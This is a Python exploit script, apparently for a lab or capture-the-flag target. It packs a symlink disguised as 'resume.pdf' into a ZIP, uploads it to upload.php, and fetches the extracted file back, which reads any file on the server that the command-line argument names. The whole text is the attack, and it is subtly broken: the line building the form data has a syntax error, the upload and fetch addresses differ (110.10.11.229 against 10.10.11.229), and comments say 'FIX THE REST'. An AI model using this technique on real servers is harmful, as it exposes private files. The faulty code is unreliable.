#!/usr/bin/env python3
import requests
import io
import zipfile
import stat
import hashlib
import sys

def calculate_md5(data):
    md5_hash = hashlib.md5()
    md5_hash.update(data)
    return md5_hash.hexdigest()

def create_zip(target_file):
    payload = io.BytesIO()
    zipInfo = zipfile.ZipInfo('resume.pdf')
    zipInfo.create_system = 3 # System which created ZIP archive, 3 = Unix; 0 = Windows
    unix_st_mode = stat.S_IFLNK | stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR # FIX THE REST
    zipInfo.external_attr = unix_st_mode << 16 # The Python zipfile module accepts the 16 # FIX THE REST
    zipOut = zipfile.ZipFile(payload, 'w', compression=zipfile.ZIP_DEFLATED)
    zipOut.writestr(zipInfo, target_file)
    zipOut.close()
    return payload.getvalue()

url = 'http://110.10.11.229/upload.php'
payload = create_zip(sys.argv[1])
files = {'zipFile': ('file.zip', payload)}
data = {'submit':'')
requests.post(url, files=files, data=data)
md5 = calculate_md5(payload)
r = requests.get(f'http://10.10.11.229/uploads/{md5}/resume.pdf')
print(r.text)
